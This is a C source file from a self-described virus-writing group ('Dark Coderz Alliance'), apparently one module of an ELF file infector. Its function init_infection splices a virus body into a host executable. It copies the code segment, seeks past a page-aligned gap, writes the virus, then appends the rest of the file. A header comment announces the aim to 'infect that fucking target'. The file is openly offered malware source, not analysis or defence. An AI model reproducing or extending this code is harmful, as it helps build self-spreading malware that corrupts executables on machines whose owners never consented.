/*
     .........................................................
     :         ____ ___.__. ____   ____  _______  ___        :
     :       _/ ___<   |  |/    \_/ __ \/  _ \  \/  /        :
     :       \  \___\___  |   |  \  ___(  <_> >    <         :
     :        \___  > ____|___|  /\___  >____/__/\_ \        :
     :            \/\/         \/     \/           \/        :
     :                   __www.cyneox.tk_                    :
     :                                                       :
     :                                                       :
     :                        member of                      :
     :                                                       :
     :             _______  _________     _____              :
     :            \______ \ \_   ___ \   /  _  \             :
     :             |    |  \/    \  \/  /  /_\  \            :
     :             |    `   \     \____/    |    \           :
     :            /_______  /\______  /\____|__  /           :
     :                    \/        \/         \/            :
     :                ( Dark Coderz Alliance )               :
     :                   __www.dca-vx.tk__                   :
     :.......................................................:

*/

/* 
     Description : well ... LETS GO BABY! lets infect that fucking target ;)
*/


#include "defines.h"

int init_infection(Infect *file)
{
	/* writting untill end of code segment... */
	write(file->fd_dest,file->mmap.start,file->end_of_codes);

	if(lseek(file->fd_dest,file->aligned_end_of_codes,SEEK_SET)<0) return false;
	
	/* write our virus to [base name][suffix] ;&) */
	
        if(!write_infection(file)) return false;
	
	/* seeking after virus code ... */

	if(lseek(file->fd_dest,file->end_of_codes+ ELF_PAGE_SZ,SEEK_SET)<0) return false;
	
	/* copying rest of the file to {base name][suffix] */

	write(file->fd_dest,file->mmap.start+file->end_of_codes,file->file_size-file->end_of_codes);


	return true;
}
